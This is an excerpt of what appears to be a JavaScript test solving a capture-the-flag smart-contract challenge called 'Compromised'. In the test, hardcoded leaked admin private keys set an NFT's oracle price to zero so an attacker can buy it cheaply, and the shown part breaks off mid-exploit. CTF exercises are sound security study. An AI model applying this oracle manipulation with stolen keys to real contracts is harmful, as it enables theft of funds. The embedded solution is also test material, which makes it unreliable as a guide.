...
describe("Compromised challenge", function () {
    ...
    before(async function () {
        ...
        this.nftToken = DamnValuableNFTFactory.attach(
    ...
    it("Exploit", async function () {
        ...
        const privateKey1 =
            "c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
        const privateKey2 =
            "208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
        const admin1 = new ethers.Wallet(privateKey1, ethers.provider)
        const admin2 = new ethers.Wallet(privateKey2, ethers.provider)
        const oracle1 = await this.oracle.connect(admin1)
        const oracle2 = await this.oracle.connect(admin2)
        const attackExchange = await this.exchange.connect(attacker)
        const attackToken = await this.nftToken.connect(attacker)

        await oracle1.postPrice("DVNFT", 0)
        await oracle2.postPrice("DVNFT", 0)

        await attackExchange.buyOne({ value: ethers.utils.parseEther("0.01") })
        await attackToken.approve(this.exchange.address, 0)
